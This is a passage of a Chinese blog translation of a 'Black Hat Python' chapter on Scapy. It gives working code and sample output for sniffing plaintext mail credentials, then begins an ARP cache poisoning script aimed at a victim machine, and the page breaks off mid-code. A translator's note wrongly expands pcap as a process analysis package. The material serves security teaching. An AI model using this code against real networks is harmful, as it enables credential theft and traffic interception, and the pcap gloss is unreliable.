<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Black Hat Python 2nd 4 | Ma9icCR</title><meta name="description" content="用 scapy 掌控网络偶尔，你会遇到这样一个经过深思熟虑的、令人惊叹的Python库，即使用一整章的篇幅来描述它也做不到。Philippe Biondi创建了这样一个数据包操作库Scapy库。您可能在完成了这一章之后，意识到我们在前两章中让您做了很多工作，而完成的是您只需一两行Scapy代码就可以完成的工作。 Scapy强大而灵活，它的可能性几乎是无限的。我们将通过嗅探流量来窃取明文电子邮件凭证"><meta name="keywords" content="Black_Hat_Python_2nd"><meta name="author" content="Ma9icCR"><meta name="copyright" content="Ma9icCR"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://ma9iccr.github.io/2021-06/Black-Hat-Python-2nd-4/"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin="crossorigin"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta property="og:type" content="article"><meta property="og:title" content="Black Hat Python 2nd 4"><meta property="og:url" content="https://ma9iccr.github.io/2021-06/Black-Hat-Python-2nd-4/"><meta property="og:site_name" content="Ma9icCR"><meta property="og:description" content="用 scapy 掌控网络偶尔，你会遇到这样一个经过深思熟虑的、令人惊叹的Python库，即使用一整章的篇幅来描述它也做不到。Philippe Biondi创建了这样一个数据包操作库Scapy库。您可能在完成了这一章之后，意识到我们在前两章中让您做了很多工作，而完成的是您只需一两行Scapy代码就可以完成的工作。 Scapy强大而灵活，它的可能性几乎是无限的。我们将通过嗅探流量来窃取明文电子邮件凭证"><meta property="og:image" content="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg"><meta property="article:published_time" content="2021-06-27T09:11:27.000Z"><meta property="article:modified_time" content="2022-03-28T07:20:18.597Z"><meta name="twitter:card" content="summary"><script>var activateDarkMode = function () {
  document.documentElement.setAttribute('data-theme', 'dark')
  if (document.querySelector('meta[name="theme-color"]') !== null) {
    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#000')
  }
}
var activateLightMode = function () {
  document.documentElement.setAttribute('data-theme', 'light')
  if (document.querySelector('meta[name="theme-color"]') !== null) {
    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#fff')
  }
}

var getCookies = function (name) {
  const value = `; ${document.cookie}`
  const parts = value.split(`; ${name}=`)
  if (parts.length === 2) return parts.pop().split(';').shift()
}

var autoChangeMode = 'false'
var t = getCookies('theme')
if (autoChangeMode === '1') {
  var isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
  var isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
  var isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

  if (t === undefined) {
    if (isLightMode) activateLightMode()
    else if (isDarkMode) activateDarkMode()
    else if (isNotSpecified || hasNoSupport) {
      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
      var now = new Date()
      var hour = now.getHours()
      var isNight = hour <= 6 || hour >= 18
      isNight ? activateDarkMode() : activateLightMode()
    }
    window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
      if (Cookies.get('theme') === undefined) {
        e.matches ? activateDarkMode() : activateLightMode()
      }
    })
  } else if (t === 'light') activateLightMode()
  else activateDarkMode()
} else if (autoChangeMode === '2') {
  now = new Date()
  hour = now.getHours()
  isNight = hour <= 6 || hour >= 18
  if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
  else if (t === 'light') activateLightMode()
  else activateDarkMode()
} else {
  if (t === 'dark') activateDarkMode()
  else if (t === 'light') activateLightMode()
}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="prev" title="Black Hat Python 2nd 5" href="https://ma9iccr.github.io/2021-06/Black-Hat-Python-2nd-5/"><link rel="next" title="Black Hat Python 2nd 3" href="https://ma9iccr.github.io/2021-06/Black-Hat-Python-2nd-3/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  bookmark: {
    message_prev: '按',
    message_next: '键将本页加入书签'
  },
  runtime_unit: '天',
  runtime: true,
  copyright: undefined,
  ClickShowText: undefined,
  medium_zoom: false,
  fancybox: true,
  Snackbar: undefined,
  justifiedGallery: {
    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
  },
  baiduPush: false,
  highlightCopy: true,
  highlightLang: true,
  isPhotoFigcaption: false,
  islazyload: true,
  isanchor: false    
}</script><script>var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isSidebar: true,
  postUpdate: '2022-03-28 15:20:18'
}</script><noscript><style>
#nav {
  opacity: 1
}
.justified-gallery img{
  opacity: 1
}
</style></noscript><meta name="generator" content="Hexo 4.2.1"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">35</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">13</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">分类</div><div class="length_num">10</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down menus-expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li><li><a class="site-page" href="/images/"><i class="fa-fw fas fa-image"></i><span> Image</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/navigate/"><i class="fa-fw fas fa-navigate"></i><span> Navigate</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#用-scapy-掌控网络"><span class="toc-number">1.</span> <span class="toc-text">用 scapy 掌控网络</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#窃取电子邮件证书"><span class="toc-number">1.1.</span> <span class="toc-text">窃取电子邮件证书</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Kicking-the-Tires"><span class="toc-number">1.1.1.</span> <span class="toc-text">Kicking the Tires</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#用Scapy完成ARP缓存毒化"><span class="toc-number">1.2.</span> <span class="toc-text">用Scapy完成ARP缓存毒化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Kicking-the-Tires-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">Kicking the Tires</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pcap处理"><span class="toc-number">1.3.</span> <span class="toc-text">Pcap处理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Kicking-the-Tires-2"><span class="toc-number">1.3.1.</span> <span class="toc-text">Kicking the Tires</span></a></li></ol></li></ol></li></ol></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg)"><nav id="nav"><span class="pull-left" id="blog_name"><a class="blog_title" id="site-name" href="/">Ma9icCR</a></span><span class="pull-right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down menus-expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li><li><a class="site-page" href="/images/"><i class="fa-fw fas fa-image"></i><span> Image</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/navigate/"><i class="fa-fw fas fa-navigate"></i><span> Navigate</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><span class="toggle-menu close"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">Black Hat Python 2nd 4</div></div><div id="post-meta"><div class="meta-firstline"><time class="post-meta__date"><span class="post-meta__date-created" title="发表于 2021-06-27 17:11:27"><i class="far fa-calendar-alt fa-fw"></i> 发表于 2021-06-27</span><span class="post-meta__separator">|</span><span class="post-meta__date-updated" title="更新于 2022-03-28 15:20:18"><i class="fas fa-history fa-fw"></i> 更新于 2022-03-28</span></time><span class="post-meta__categories"><span class="post-meta__separator">|</span><i class="fas fa-inbox fa-fw post-meta__icon"></i><a class="post-meta__categories" href="/categories/books/">books</a></span></div><div class="meta-secondline"> </div><div class="meta-thirdline"><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta__icon"></i><span>阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h1 id="用-scapy-掌控网络"><a href="#用-scapy-掌控网络" class="headerlink" title="用 scapy 掌控网络"></a>用 scapy 掌控网络</h1><p>偶尔，你会遇到这样一个经过深思熟虑的、令人惊叹的Python库，即使用一整章的篇幅来描述它也做不到。Philippe Biondi创建了这样一个数据包操作库Scapy库。您可能在完成了这一章之后，意识到我们在前两章中让您做了很多工作，而完成的是您只需一两行Scapy代码就可以完成的工作。</p>
<p>Scapy强大而灵活，它的可能性几乎是无限的。我们将通过嗅探流量来窃取明文电子邮件凭证，然后ARP欺骗网络上的目标机器，这样我们就可以嗅探它们的流量。最后，我们将扩展Scapy的pcap(笔者注：过程特性分析软件包（Process Characterization Analysis Package）)处理，从HTTP流量中切割出图像，然后对它们执行面部检测，以确定图像中是否存在人类。</p>
<p>我们建议您在Linux系统下使用Scapy，因为它是为Linux设计的。最新版本的Scapy确实支持Windows，但在本章中，我们会假设您使用的是安装了功能完整的Scapy的Kali虚拟机(VM)。如果您还没有Scapy，请访问<a href="https://scapy.net/" target="_blank" rel="noopener">https://scapy.net/</a>来安装它。</p>
<p>现在，假设您已经渗透了目标的局域网(LAN)。您可以使用本章中将学到的技术嗅探本地网络上的流量。</p>
<h2 id="窃取电子邮件证书"><a href="#窃取电子邮件证书" class="headerlink" title="窃取电子邮件证书"></a>窃取电子邮件证书</h2><p>您已经花了一些时间来了解Python中嗅探的具体细节。让我们来了解一下Scapy嗅探包并分析其内容的接口。我们将构建一个非常简单的嗅探器来捕获简单邮件传输协议(SMTP)、邮局协议(POP3)和互联网消息访问协议(IMAP)的凭据。之后，通过将嗅探器与地址解析协议(ARP)欺骗、中间人(MITM)攻击结合起来，我们可以很容易地从网络上的其他机器窃取凭证。当然，这种技术可以应用于任何协议，也可以简单地吸收所有流量并将其存储在pcap文件中进行分析，我们也将演示这一点。</p>
<p>为了对Scapy有一个初步的了解，让我们首先构建一个嗅探器的骨架，它只是简单地分析和转储数据包。这个名为 <em>sniff</em> 的函数如下所示:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sniff(filter=<span class="string">""</span>,iface=<span class="string">"any"</span>,prn=function,count=N)</span><br></pre></td></tr></table></figure>

<p><em>filter</em> 参数让我们可以为Scapy嗅探的包指定Berkeley Packet Filter (BPF，Berkeley”伯克利”包过滤)过滤器，也可以将其留空以嗅探所有包。例如，要嗅探所有HTTP数据包，您将使用 <em>tcp port 80</em> 的BPF过滤器。<em>iface</em> 参数告诉嗅探器要嗅探哪个网络接口;如果为空，Scapy将嗅探所有接口。<em>prn</em> 参数指定为每个匹配过滤器的包所调用的回调函数，回调函数接收包对象作为它的单个参数。<em>count</em> 参数指定要嗅探的数据包数量;如果它是空的，Scapy就会不停地嗅探。</p>
<p>让我们从创建一个简单的嗅探器开始，让它嗅探数据包并转储其内容。然后，我们将扩展它，只嗅探与电子邮件相关的部分。打开 <em>mail_sniffer.py</em> ，编写以下代码:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> sniff</span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>] <span class="function"><span class="keyword">def</span> <span class="title">packet_callback</span><span class="params">(packet)</span>:</span></span><br><span class="line">    print(packet.show())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">[<span class="number">2</span>] sniff(prn=packet_callback, count=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">     main()</span><br></pre></td></tr></table></figure>

<p>我们首先定义回调函数，该函数将接收每个嗅探到的包[1]，然后告诉Scapy开始在所有接口上嗅探[2]而不进行过滤。现在让我们运行这个脚本，您应该会看到类似如下的输出:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">$ (bhp) tim@kali:~/bhp/bhp$ sudo python mail_sniffer.py</span><br><span class="line"> <span class="comment">###[ Ethernet ]###</span></span><br><span class="line">  dst       = <span class="number">42</span>:<span class="number">26</span>:<span class="number">19</span>:<span class="number">1</span>a:<span class="number">31</span>:<span class="number">64</span></span><br><span class="line">  src       = <span class="number">00</span>:<span class="number">0</span>c:<span class="number">29</span>:<span class="number">39</span>:<span class="number">46</span>:<span class="number">7</span>e</span><br><span class="line">  type      = IPv6</span><br><span class="line"><span class="comment">###[ IPv6 ]###</span></span><br><span class="line">     version   = <span class="number">6</span></span><br><span class="line">     tc        = <span class="number">0</span></span><br><span class="line">     fl        = <span class="number">661536</span></span><br><span class="line">     plen      = <span class="number">51</span></span><br><span class="line">     nh        = UDP</span><br><span class="line">     hlim      = <span class="number">255</span></span><br><span class="line">     src       = fe80::<span class="number">20</span>c:<span class="number">29</span>ff:fe39:<span class="number">467</span>e</span><br><span class="line">     dst       = fe80::<span class="number">1079</span>:<span class="number">9</span>d3f:d4a8:defb</span><br><span class="line"><span class="comment">###[ UDP ]###</span></span><br><span class="line">        sport     = <span class="number">42638</span></span><br><span class="line">        dport     = domain</span><br><span class="line">        len       = <span class="number">51</span></span><br><span class="line">        chksum    = <span class="number">0xcf66</span></span><br><span class="line"><span class="comment">###[ DNS ]###</span></span><br><span class="line">           id        = <span class="number">22299</span></span><br><span class="line">           qr        = <span class="number">0</span></span><br><span class="line">           opcode    = QUERY</span><br><span class="line">           aa        = <span class="number">0</span></span><br><span class="line">           tc        = <span class="number">0</span></span><br><span class="line">           rd        = <span class="number">1</span></span><br><span class="line">           ra        = <span class="number">0</span></span><br><span class="line">           z         = <span class="number">0</span></span><br><span class="line">           ad        = <span class="number">0</span></span><br><span class="line">           cd        = <span class="number">0</span></span><br><span class="line">           rcode     = ok</span><br><span class="line">           qdcount   = <span class="number">1</span></span><br><span class="line">           ancount   = <span class="number">0</span></span><br><span class="line">           nscount   = <span class="number">0</span></span><br><span class="line">           arcount   = <span class="number">0</span></span><br><span class="line">           \qd        \</span><br><span class="line">            |<span class="comment">###[ DNS Question Record ]###</span></span><br><span class="line">            |  qname     = <span class="string">'vortex.data.microsoft.com.'</span></span><br><span class="line">            |  qtype     = A</span><br><span class="line">            |  qclass    = IN</span><br><span class="line">           an        = <span class="literal">None</span></span><br><span class="line">           ns        = <span class="literal">None</span></span><br><span class="line">           ar        = <span class="literal">None</span></span><br></pre></td></tr></table></figure>

<p>这是多么令人难以置信的简单!我们可以看到，当在网络上收到第一个包时，回调函数使用了内置函数 <em>packet.show</em> 去显示报文内容，并分析一些协议信息。使用 <em>show</em> 是调试脚本的一种好方法，可以帮助确定你捕获了所需的输出。</p>
<p>现在我们已经运行了基本的嗅探器，让我们应用一个过滤器，并向回调函数添加一些规则，以提取与电子邮件相关的身份验证字符串。</p>
<p>在下面的示例中，我们将使用包过滤器，以便让嗅探器只显示我们感兴趣的包。我们将使用BPF语法(也称为 <em>Wireshark style</em> )来实现这一点。在tcpdump等工具以及在Wireshark使用包捕获过滤器中，您也将遇到这种语法。</p>
<p>让我们介绍一下BPF过滤器的基本语法。您可以在过滤器中使用三种信息的类型。您可以指定描述符(如特定的主机、接口或端口)、流量流向和协议，如表4-1所示。您也可以包含或忽略某类型、方向和协议，这取决于您希望在嗅探的包中看到的内容。</p>
<p><img src= "/img/loading.gif" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/image-20210708200456876.png" alt="image-20210708200456876"></p>
<p>例如，表达式 <em>src 192.168.1.100</em> 指定了过滤器只捕获来自机器192.168.1.100的包。相反的过滤器是 <em>dst 192.168.1.100</em> ，它只捕获目标为192.168.1.100的数据包。同样，表达式 <em>tcp port 110 or tcp port 25</em> 指定了过滤器只通过来自或到达端口110或25的tcp数据包。现在让我们在示例中使用BPF语法编写一个特定的嗅探器:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> sniff, TCP, IP</span><br><span class="line"><span class="comment"># the packet callback</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">packet_callback</span><span class="params">(packet)</span>:</span></span><br><span class="line">[<span class="number">1</span>] <span class="keyword">if</span> packet[TCP].payload:</span><br><span class="line">         mypacket = str(packet[TCP].payload)</span><br><span class="line">    [<span class="number">2</span>] <span class="keyword">if</span> <span class="string">'user'</span> <span class="keyword">in</span> mypacket.lower() <span class="keyword">or</span> <span class="string">'pass'</span> <span class="keyword">in</span> mypacket.lower():</span><br><span class="line">            print(<span class="string">f"[*] Destination: <span class="subst">&#123;packet[IP].dst&#125;</span>"</span>)</span><br><span class="line">        [<span class="number">3</span>] print(<span class="string">f"[*] <span class="subst">&#123;str(packet[TCP].payload)&#125;</span>"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># fire up the sniffer</span></span><br><span class="line">[<span class="number">4</span>] sniff(filter=<span class="string">'tcp port 110 or tcp port 25 or tcp port 143'</span>,</span><br><span class="line">             prn=packet_callback, store=<span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">     main()</span><br></pre></td></tr></table></figure>

<p>这很简单吧。我们更改了 <em>sniff</em> 功能函数，以添加一个BPF过滤器，它只包括目的地为普通邮件端口110 (POP3)、143 (IMAP)和25 (SMTP) [4]的流量。我们还使用了一个名为 <em>store</em> 的新参数，当该参数设置为0时，可以确保Scapy不会将数据包保存在内存中。如果您打算让一个嗅探器长期地运行，那么使用这个参数是一个好主意，因为这样您就不会消耗大量的RAM。当调用回调函数时，我们需要检查以确保它有一个数据有效负载[1]，以及有效负载是否包含典型的 <em>USER</em> 或 <em>PASS</em> 邮件命令[2]。如果我们检测到认证字符串，我们将输出要发送到的服务器和数据包的实际数据字节[3]。</p>
<h3 id="Kicking-the-Tires"><a href="#Kicking-the-Tires" class="headerlink" title="Kicking the Tires"></a>Kicking the Tires</h3><p>下面是作者试图连接邮件客户端到的虚拟电子邮件帐户的一些示例输出:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(bhp) root@kali:/home/tim/bhp/bhp<span class="comment"># python mail_sniffer.py</span></span><br><span class="line">[*] Destination: <span class="number">192.168</span><span class="number">.1</span><span class="number">.207</span></span><br><span class="line">[*] <span class="string">b'USER tim\n'</span></span><br><span class="line">[*] Destination: <span class="number">192.168</span><span class="number">.1</span><span class="number">.207</span></span><br><span class="line">[*] <span class="string">b'PASS 1234567\n'</span></span><br></pre></td></tr></table></figure>

<p>您可以看到，我们的邮件客户端正试图登录到192.168.1.207的服务器，并通过网络发送明文凭据。这是一个非常简单的示例，演示了如何在渗透测试中使用Scapy嗅探脚本并将其转换为有用的工具。该脚本适用于邮件通信，因为我们将BPF过滤器设计为专注于与邮件相关的端口。您可以更改该过滤器来监控其他流量;例如，将其更改为tcp端口21，以监视FTP连接和凭据。</p>
<p>嗅探自己的流量可能很有趣，但和朋友一起实践嗅探总是更好的;让我们看看如何执行ARP欺骗攻击来嗅探同一网络上目标机器的流量。</p>
<h2 id="用Scapy完成ARP缓存毒化"><a href="#用Scapy完成ARP缓存毒化" class="headerlink" title="用Scapy完成ARP缓存毒化"></a>用Scapy完成ARP缓存毒化</h2><p>ARP毒化(欺骗)是黑客最古老但最有效的把戏之一。它很简单，我们将使目标机器相信我们已经成为了它的网关，我们还将使网关相信，为了到达目标机器，所有的流量都必须通过我们。网络上的每台计算机都维护着一个ARP缓存，它存储着与本地网络上的IP地址相匹配的最新的MAC地址。我们将使用我们进入并控制的机器毒化这个缓存，以实现这种攻击。由于地址解析协议ARP(Address Resolution Protocol)和ARP毒化通常在许多其他材料中都有涉及，因此我们将留给您自己做这些必需的搜索，以了解这种攻击在较低层网络中是如何生效的。</p>
<p>既然我们知道了我们需要做什么，就把它付诸实践吧。当作者对此进行测试时，我们用Kali VM攻击了一台实体的Mac机器。我们还针对连接到无线接入点的多种移动设备测试了这段代码，它的效果很好。我们要做的第一件事是检查目标Mac机器上的ARP缓存，这样我们就能看到之后攻击的情况。检查以下内容来了解如何在你的Mac上检查ARP缓存:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">MacBook-Pro:~ victim$ ifconfig en0</span><br><span class="line">en0: flags=8863&lt;UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST&gt; mtu 1500</span><br><span class="line">ether 38:f9:d3:63:5c:48</span><br><span class="line">inet6 fe80::4bc:91d7:29ee:51d8%en0 prefixlen 64 secured scopeid 0x6</span><br><span class="line">inet 192.168.1.193 netmask 0xffffff00 broadcast 192.168.1.255</span><br><span class="line">inet6 2600:1700:c1a0:6ee0:1844:8b1c:7fe0:79c8 prefixlen 64 autoconf secured</span><br><span class="line">inet6 2600:1700:c1a0:6ee0:fc47:7c52:affd:f1f6 prefixlen 64 autoconf temporary</span><br><span class="line">inet6 2600:1700:c1a0:6ee0::31 prefixlen 64 dynamic</span><br><span class="line">nd6 options=201&lt;PERFORMNUD,DAD&gt;</span><br><span class="line">media: autoselect</span><br><span class="line">status: active</span><br></pre></td></tr></table></figure>

<p><em>ifconfig</em> 命令显示指定接口(这里是 en0 )的网络配置，如果没有指定，则显示所有接口的网络配置。输出中显示了该设备的 <em>inet</em> (IPv4)地址为 192.168.1.193 。也列出了MAC地址(38:f9:d3:63:5c:48，标记为 <em>ether</em> )和一些IPv6地址。ARP欺骗只对IPv4有效，所以我们将忽略IPv6地址。</p>
<p>现在让我们看看Mac在它的ARP地址缓存中有什么。下面是它认为的邻居的MAC地址:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MacBook-Pro:~ victim$ arp -a</span><br><span class="line">[1] kali.attlocal.net (192.168.1.203) at a4:5e:60:ee:17:5d on en0 ifscope</span><br><span class="line">[2] dsldevice.attlocal.net (192.168.1.254) at 20:e5:64:c0:76:d0 on en0 ifscope</span><br><span class="line">? (192.168.1.255) at ff:ff:ff:ff:ff:ff on en0 ifscope [ethernet]</span><br></pre></td></tr></table></figure>

<p>我们可以看到攻击者[1]的Kali机器的IP地址是 192.168.1.203 ,MAC地址是 a4:5e:60:ee:17:5d 。网关将攻击者和受害者的机器都连接到互联网上。它的IP地址[2]是 192.168.1.254 ，它关联的ARP缓存项的MAC地址是 20:e5:64:c0:76:d0 。我们将记录这些值，因为我们可以在攻击发生时查看ARP缓存，并看到我们已经改变了网关上注册的MAC地址。现在我们知道了网关和目标IP地址，让我们开始编写ARP欺骗脚本。打开一个新的Python文件，命名为 <em>arper.py</em> ，并输入以下代码。我们将从文件的框架开始，让您了解我们将如何构造毒化攻击程序:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> (ARP, Ether, conf, get_if_hwaddr,</span><br><span class="line">                       send, sniff, sndrcv, srp, wrpcap)</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">[<span class="number">1</span>] <span class="function"><span class="keyword">def</span> <span class="title">get_mac</span><span class="params">(targetip)</span>:</span></span><br><span class="line">     <span class="keyword">pass</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span 